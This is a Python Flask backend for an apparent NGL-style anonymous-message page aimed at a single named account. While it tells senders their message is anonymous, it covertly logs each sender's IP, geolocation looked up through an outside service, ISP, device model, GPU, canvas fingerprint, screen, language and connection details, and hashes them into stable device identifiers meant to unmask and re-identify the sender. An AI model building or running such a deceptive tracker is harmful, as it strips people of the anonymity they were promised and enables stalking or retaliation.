from collections import defaultdict, deque
from datetime import datetime
from hashlib import sha256
from ipaddress import ip_address
from threading import Lock
from time import monotonic
from zoneinfo import ZoneInfo
import json
import logging

import requests
from flask import Flask, request
from user_agents import parse
from werkzeug.middleware.proxy_fix import ProxyFix


# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------

app = Flask(__name__)

# Render terminates HTTPS before forwarding to Flask.
# Do NOT trust X-Forwarded-For for identity here; client IP is read from
# Cloudflare's CF-Connecting-IP header below.
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1)

FRONTEND_ORIGIN = "https://itsghostblade.github.io"
TARGET_USERNAME = "@root.init_vaibhav"

RATE_LIMIT_REQUESTS = 20
RATE_LIMIT_WINDOW_SECONDS = 60

NETWORK_CACHE_TTL_SECONDS = 6 * 60 * 60
NETWORK_CACHE_MAX_ENTRIES = 1024

IST = ZoneInfo("Asia/Kolkata")

# Small POSTs only. This is far above what the current fingerprint payload needs.
app.config["MAX_CONTENT_LENGTH"] = 32 * 1024

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
logger = logging.getLogger("ngl_backend")

_rate_buckets = defaultdict(deque)
_rate_lock = Lock()
_network_cache = {}
_network_cache_lock = Lock()
_ip_api_blocked_until = 0.0
_ip_api_lock = Lock()

SUCCESS_PAGE = f"""
<div style="background:white;padding:40px;border-radius:35px;text-align:center;font-family:sans-serif;">
    <h1 style="color:#FE2F78;">✅ Sent!</h1>
    <p style="color:#666;">Your anonymous message has been delivered to {TARGET_USERNAME}</p>
</div>
"""


# -----------------------------------------------------------------------------
# CORS
# -----------------------------------------------------------------------------

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get("Origin")
    if origin == FRONTEND_ORIGIN:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Vary"] = "Origin"
        response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response


# -----------------------------------------------------------------------------
# Input helpers
# -----------------------------------------------------------------------------

def clean_form_field(name, max_length=500, default="Unknown"):
    value = request.form.get(name, "")
    if not isinstance(value, str):
        return default
    value = value.strip()
    return value[:max_length] if value else default


def clean_header(name, max_length=1000, default="Unknown"):
    value = request.headers.get(name, "").strip()
    return value[:max_length] if value else default


def safe_log_text(value):
    return str(value).replace("\r", "\\r").replace("\n", "\\n")


def known(value):
    return value not in (None, "", "Unknown", "Unavailable", "null", "undefined")


def validate_message():
    msg = request.form.get("message", "")
    if not isinstance(msg, str):
        raise ValueError("Invalid message.")

    msg = msg.strip()
    if not msg:
        raise ValueError("Message is required.")
    if len(msg) > 300:
        raise ValueError("Message must be 300 characters or fewer.")

    return msg


def get_device_fields():
    ram = clean_form_field("ram", 20)
    return {
        "collector_version": clean_form_field("collector_version", 30, default="legacy"),
        # Existing fields
        "gpu_renderer": clean_form_field("gpu_renderer", 500,
                                         clean_form_field("gpu", 500)),
        "gpu_vendor": clean_form_field("gpu_vendor", 300),
        "resolution": clean_form_field("res", 80),
        "screen_css": clean_form_field("screen_css", 80),
        "avail_screen": clean_form_field("avail_screen", 80),
        "dpr": clean_form_field("dpr", 30),
        "color_depth": clean_form_field("color_depth", 30),
        "pixel_depth": clean_form_field("pixel_depth", 30),
        "orientation": clean_form_field("orientation", 100),
        "ram": ram,
        "cores": clean_form_field("cores", 20),
        "touch_points": clean_form_field("touch_points", 20),

        # Locale/platform
        "timezone": clean_form_field("timezone", 100),
        "timezone_offset": clean_form_field("timezone_offset", 30),
        "language": clean_form_field("language", 100),
        "languages": clean_form_field("languages", 500),
        "platform": clean_form_field("platform", 150),
        "vendor": clean_form_field("vendor", 200),
        "cookie_enabled": clean_form_field("cookie_enabled", 20),
        "webdriver": clean_form_field("webdriver", 20),

        # UA Client Hints high-entropy values (Chromium-family when available)
        "ua_model": clean_form_field("ua_model", 200),
        "ua_arch": clean_form_field("ua_arch", 100),
        "ua_bitness": clean_form_field("ua_bitness", 50),
        "ua_platform": clean_form_field("ua_platform", 100),
        "ua_platform_version": clean_form_field("ua_platform_version", 100),
        "ua_full_versions": clean_form_field("ua_full_versions", 1200),
        "ua_form_factors": clean_form_field("ua_form_factors", 300),

        # Connection API values (availability varies)
        "connection_type": clean_form_field("connection_type", 50),
        "effective_type": clean_form_field("effective_type", 50),
        "downlink": clean_form_field("downlink", 50),
        "rtt": clean_form_field("rtt", 50),
        "save_data": clean_form_field("save_data", 20),

        # Fingerprinting signal generated in the browser
        "canvas_fp": clean_form_field("canvas_fp", 128),
    }


# -----------------------------------------------------------------------------
# Client IP / browser helpers
# -----------------------------------------------------------------------------

def _validated_ip(value):
    if not value:
        return None
    try:
        return str(ip_address(value.strip()))
    except ValueError:
        return None


def get_client_ip():
    """Get the public visitor IP on Render.

    Render public traffic passes through Cloudflare. CF-Connecting-IP is the
    preferred source because X-Forwarded-For can contain caller-controlled data.
    """
    cf_ip = _validated_ip(request.headers.get("CF-Connecting-IP", ""))
    if cf_ip:
        return cf_ip

    # Fallback for unusual/local deployments.
    remote = _validated_ip(request.remote_addr or "")
    if remote:
        return remote

    return "Unknown"


def parse_user_agent():
    ua_string = clean_header("User-Agent", 1500, default="")
    parsed = parse(ua_string)

    brand = parsed.device.brand or ""
    model = parsed.device.model or parsed.device.family or ""
    device_name = " ".join(part for part in (brand, model) if part).strip()

    os_name = parsed.os.family or "Unknown"
    os_version = parsed.os.version_string or ""
    browser_name = parsed.browser.family or "Unknown"
    browser_version = parsed.browser.version_string or ""

    return {
        "raw": ua_string or "Unknown",
        "device": device_name or "Unknown",
        "os": f"{os_name} {os_version}".strip(),
        "browser": f"{browser_name} {browser_version}".strip(),
    }


def get_browser_headers():
    return {
        "accept_language": clean_header("Accept-Language", 500),
        "accept_encoding": clean_header("Accept-Encoding", 300),
        "sec_ch_ua": clean_header("Sec-CH-UA", 700),
        "sec_ch_ua_mobile": clean_header("Sec-CH-UA-Mobile", 50),
        "sec_ch_ua_platform": clean_header("Sec-CH-UA-Platform", 150),
        "dnt": clean_header("DNT", 20),
        "gpc": clean_header("Sec-GPC", 20),
    }


def _fingerprint_hash(material):
    canonical = json.dumps(
        material,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=False,
    )
    return sha256(canonical.encode("utf-8")).hexdigest()[:24]


def build_fingerprints(ip, ua, d, h):
    # "Stable" means slower-changing, not permanent or guaranteed unique.
    stable_material = {
        "gpu_vendor": d["gpu_vendor"],
        "gpu_renderer": d["gpu_renderer"],
        "canvas_fp": d["canvas_fp"],
        "resolution": d["resolution"],
        "screen_css": d["screen_css"],
        "dpr": d["dpr"],
        "color_depth": d["color_depth"],
        "ram": d["ram"],
        "cores": d["cores"],
        "touch_points": d["touch_points"],
        "timezone": d["timezone"],
        "platform": d["ua_platform"] if known(d["ua_platform"]) else d["platform"],
        "model": d["ua_model"],
        "architecture": d["ua_arch"],
        "bitness": d["ua_bitness"],
    }

    full_material = {
        **stable_material,
        "ua": ua["raw"],
        "ua_full_versions": d["ua_full_versions"],
        "ua_platform_version": d["ua_platform_version"],
        "languages": d["languages"],
        "vendor": d["vendor"],
        "orientation": d["orientation"],
        "accept_language": h["accept_language"],
        "sec_ch_ua": h["sec_ch_ua"],
        "sec_ch_ua_platform": h["sec_ch_ua_platform"],
    }

    stable_id = _fingerprint_hash(stable_material)
    full_id = _fingerprint_hash(full_material)
    network_id = sha256(f"{ip}|{full_id}".encode("utf-8")).hexdigest()[:24]
    return stable_id, full_id, network_id


# -----------------------------------------------------------------------------
# Rate limiting
# -----------------------------------------------------------------------------

def is_rate_limited(ip):
    now = monotonic()
    cutoff = now - RATE_LIMIT_WINDOW_SECONDS

    with _rate_lock:
        bucket = _rate_buckets[ip]
        while bucket and bucket[0] <= cutoff:
            bucket.popleft()

        if len(bucket) >= RATE_LIMIT_REQUESTS:
            return True

        bucket.append(now)
        return False


# -----------------------------------------------------------------------------
# Network lookup
# -----------------------------------------------------------------------------

def _get_cached_network(ip):
    now = monotonic()
    with _network_cache_lock:
        cached = _network_cache.get(ip)
        if not cached:
            return None
        expires_at, data = cached
        if expires_at <= now:
            _network_cache.pop(ip, None)
            return None
        return data


def _cache_network(ip, data):
    now = monotonic()
    with _network_cache_lock:
        if len(_network_cache) >= NETWORK_CACHE_MAX_ENTRIES and ip not in _network_cache:
            oldest_key = min(_network_cache, key=lambda key: _network_cache[key][0])
            _network_cache.pop(oldest_key, None)
        _network_cache[ip] = (now + NETWORK_CACHE_TTL_SECONDS, data)


def lookup_network(ip):
    global _ip_api_blocked_until

    fallback = {
        "isp": "Unknown",
        "org": "Unknown",
        "asn": "Unknown",
        "asname": "Unknown",
        "city": "Unknown",
        "region": "Unknown",
        "country": "Unknown",
        "timezone": "Unknown",
        "mobile": "Unknown",
        "proxy": "Unknown",
        "hosting": "Unknown",
    }

    if ip == "Unknown":
        return fallback

    try:
        parsed = ip_address(ip)
        if not parsed.is_global:
            return {**fallback, "isp": "Local/Reserved IP"}
    except ValueError:
        return fallback

    cached = _get_cached_network(ip)
    if cached:
        return cached

    with _ip_api_lock:
        if monotonic() < _ip_api_blocked_until:
            return {**fallback, "isp": "Lookup temporarily rate-limited"}

    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}",
            params={
                "fields": (
                    "status,message,isp,org,as,asname,city,regionName,"
                    "country,timezone,mobile,proxy,hosting"
                )
            },
            timeout=3,
        )
        response.raise_for_status()
        payload = response.json()

        if response.headers.get("X-Rl") == "0":
            try:
                ttl = max(1, int(response.headers.get("X-Ttl", "60")))
            except ValueError:
                ttl = 60
            with _ip_api_lock:
                _ip_api_blocked_until = monotonic() + ttl

        if payload.get("status") != "success":
            logger.warning("IP lookup failed for %s: %s",
                           ip, payload.get("message", "unknown"))
            return fallback

        data = {
            "isp": payload.get("isp") or "Unknown",
            "org": payload.get("org") or "Unknown",
            "asn": payload.get("as") or "Unknown",
            "asname": payload.get("asname") or "Unknown",
            "city": payload.get("city") or "Unknown",
            "region": payload.get("regionName") or "Unknown",
            "country": payload.get("country") or "Unknown",
            "timezone": payload.get("timezone") or "Unknown",
            "mobile": payload.get("mobile", "Unknown"),
            "proxy": payload.get("proxy", "Unknown"),
            "hosting": payload.get("hosting", "Unknown"),
        }
        _cache_network(ip, data)
        return data

    except (requests.RequestException, ValueError) as exc:
        logger.warning("Network lookup error for %s: %s", ip, exc)
        return fallback


# -----------------------------------------------------------------------------
# Compact useful logging
# -----------------------------------------------------------------------------

def _join_known(parts, separator=" | "):
    return separator.join(
        safe_log_text(value)
        for value in parts
        if known(value)
    )


def log_submission(msg, ip, network, ua, d, h, stable_id, full_id, network_id):
    timestamp = datetime.now(IST).isoformat(timespec="seconds")
    request_id = clean_header("Rndr-Id", 200)
    cf_ray = clean_header("CF-Ray", 200)

    received_keys = sorted(request.form.keys())

    lines = [
        "",
        "#" * 76,
        f"🎯 TARGET: {TARGET_USERNAME} | {timestamp} IST",
        f"💬 MSG: {safe_log_text(msg)}",
        f"📦 COLLECTOR: {safe_log_text(d['collector_version'])} | fields={len(received_keys)}",
        f"🧾 RECEIVED: {safe_log_text(','.join(received_keys))}",
        f"🧬 FP: stable={stable_id} | full={full_id} | network={network_id}",
        f"🌍 IP: {safe_log_text(ip)}",
    ]

    trace = _join_known([request_id, cf_ray])
    if trace:
        lines.append(f"🆔 REQUEST: {trace}")

    # Prefer UA-CH's model/platform where available; parser is fallback only.
    device_bits = []
    if known(d["ua_model"]):
        device_bits.append(d["ua_model"])
    elif known(ua["device"]) and "Generic" not in ua["device"]:
        device_bits.append(ua["device"])

    platform_bits = []
    if known(d["ua_platform"]):
        platform_bits.append(d["ua_platform"])
    elif known(d["platform"]):
        platform_bits.append(d["platform"])

    if known(d["ua_platform_version"]):
        platform_bits.append(d["ua_platform_version"])
    elif known(ua["os"]):
        platform_bits.append(ua["os"])

    device_line = _join_known(device_bits + platform_bits)
    if device_line:
        lines.append(f"📱 DEVICE: {device_line}")

    browser_bits = [ua["browser"]]
    if known(d["ua_full_versions"]):
        browser_bits.append(f"full={d['ua_full_versions']}")
    lines.append(f"🌐 BROWSER: {_join_known(browser_bits)}")

    net_location = _join_known([
        network["isp"], network["city"], network["region"], network["country"]
    ])
    if net_location:
        lines.append(f"📡 NETWORK: {net_location}")

    asn_org = _join_known([network["asn"], network["asname"], network["org"]])
    if asn_org:
        lines.append(f"🏢 ASN/ORG: {asn_org}")

    net_flags = []
    for label, value in (
        ("mobile", network["mobile"]),
        ("proxy", network["proxy"]),
        ("hosting", network["hosting"]),
        ("tz", network["timezone"]),
    ):
        if known(value):
            net_flags.append(f"{label}={safe_log_text(value)}")
    if net_flags:
        lines.append("🛰️ NET FLAGS: " + " | ".join(net_flags))

    hardware = []
    if known(d["cores"]):
        hardware.append(f"CPU={d['cores']}")
    if known(d["ram"]):
        hardware.append(f"RAM={d['ram']}GB")
    if known(d["touch_points"]):
        hardware.append(f"touch={d['touch_points']}")
    if known(d["gpu_vendor"]):
        hardware.append(f"GPU vendor={d['gpu_vendor']}")
    if known(d["gpu_renderer"]):
        hardware.append(f"GPU={d['gpu_renderer']}")
    if hardware:
        lines.append("⚙️ HARDWARE: " + " | ".join(map(safe_log_text, hardware)))

    display = []
    for label, value in (
        ("physical", d["resolution"]),
        ("css", d["screen_css"]),
        ("avail", d["avail_screen"]),
        ("DPR", d["dpr"]),
        ("color", d["color_depth"]),
        ("orientation", d["orientation"]),
    ):
        if known(value):
            display.append(f"{label}={safe_log_text(value)}")
    if display:
        lines.append("🖥️ DISPLAY: " + " | ".join(display))

    ua_ch = []
    for label, value in (
        ("model", d["ua_model"]),
        ("arch", d["ua_arch"]),
        ("bits", d["ua_bitness"]),
        ("platform", d["ua_platform"]),
        ("platformVer", d["ua_platform_version"]),
        ("form", d["ua_form_factors"]),
    ):
        if known(value):
            ua_ch.append(f"{label}={safe_log_text(value)}")
    if ua_ch:
        lines.append("🧩 UA-CH: " + " | ".join(ua_ch))

    locale = []
    for label, value in (
        ("langs", d["languages"]),
        ("timezone", d["timezone"]),
        ("offset", d["timezone_offset"]),
    ):
        if known(value):
            locale.append(f"{label}={safe_log_text(value)}")
    if locale:
        lines.append("🗺️ LOCALE: " + " | ".join(locale))

    connection = []
    for label, value in (
        ("type", d["connection_type"]),
        ("effective", d["effective_type"]),
        ("downlink", d["downlink"]),
        ("rtt", d["rtt"]),
        ("saveData", d["save_data"]),
    ):
        if known(value):
            connection.append(f"{label}={safe_log_text(value)}")
    if connection:
        lines.append("📶 CONNECTION: " + " | ".join(connection))

    if known(d["canvas_fp"]):
        lines.append(f"🎨 CANVAS FP: {safe_log_text(d['canvas_fp'])}")

    privacy = []
    if known(h["dnt"]):
        privacy.append(f"DNT={h['dnt']}")
    if known(h["gpc"]):
        privacy.append(f"GPC={h['gpc']}")
    if known(d["cookie_enabled"]):
        privacy.append(f"cookies={d['cookie_enabled']}")
    if known(d["webdriver"]):
        privacy.append(f"webdriver={d['webdriver']}")
    if privacy:
        lines.append("🛡️ PRIVACY/ENV: " + " | ".join(map(safe_log_text, privacy)))

    lines.append("#" * 76)
    logger.info("%s", "\n".join(lines))


# -----------------------------------------------------------------------------
# Routes
# -----------------------------------------------------------------------------

@app.route("/")
def home():
    return f"NGL Backend for {TARGET_USERNAME} is ONLINE.", 200


@app.route("/submit", methods=["POST", "OPTIONS"])
def submit():
    if request.method == "OPTIONS":
        return "", 204

    try:
        ip = get_client_ip()

        if is_rate_limited(ip):
            logger.warning("Rate limit reached for IP %s", ip)
            return "Too many requests", 429

        msg = validate_message()
        device = get_device_fields()
        ua = parse_user_agent()
        browser_headers = get_browser_headers()
        network = lookup_network(ip)

        stable_id, full_id, network_id = build_fingerprints(
            ip, ua, device, browser_headers
        )

        log_submission(
            msg, ip, network, ua, device, browser_headers,
            stable_id, full_id, network_id
        )

        return SUCCESS_PAGE, 200

    except ValueError as exc:
        logger.info("Rejected submission: %s", exc)
        return str(exc), 400
    except Exception:
        logger.exception("Unexpected error while processing submission")
        return "Internal Error", 500


if __name__ == "__main__":
    app.run()
